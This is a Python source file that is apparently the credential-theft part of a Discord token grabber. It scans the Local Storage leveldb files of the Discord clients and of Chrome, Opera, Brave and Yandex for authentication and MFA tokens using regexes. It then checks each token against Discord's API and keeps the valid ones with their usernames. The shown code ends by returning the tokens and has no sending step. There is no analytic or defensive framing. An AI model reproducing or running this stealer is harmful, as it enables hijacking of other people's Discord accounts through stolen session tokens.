import os
import re

from requests import get

PAYLOAD_PATH = os.path.realpath(__file__)
def find_tokens(path: str) -> list[str]:
  path += "\\Local Storage\\leveldb"
  tokens: list[str] = []
  for file_name in os.listdir(path):
    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
      continue
    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
      for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,40}", r"mfa\.[\w-]{84}"):
        for token in re.findall(regex, line):
          tokens.append(token)
  return tokens
def get_username(token: str) -> str:
  try:
    re = get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    if re.status_code == 200:
      return re.json()["username"]
    else:
      return ""
  except Exception:
    return ""
def get_token() -> dict[str, str]:
  _tokens: list[str] = []
  local: str = str(os.getenv("LOCALAPPDATA"))
  roaming: str = str(os.getenv("APPDATA"))
  paths: dict[str, str] = {
    "Discord": roaming + "\\Discord",
    "Discord Canary": roaming + "\\discordcanary",
    "Discord PTB": roaming + "\\discordptb",
    "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
    "Opera": roaming + "\\Opera Software\\Opera Stable",
    "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
  }
  for _, path in paths.items():
    if not os.path.exists(path):
      continue
    tks = find_tokens(path)
    if tks:
      for tk in tks:
        _tokens.append(tk)
  token: dict[str, str] = {}
  for t in _tokens:
    if x:=get_username(t):
      token.update({t: x})
  return token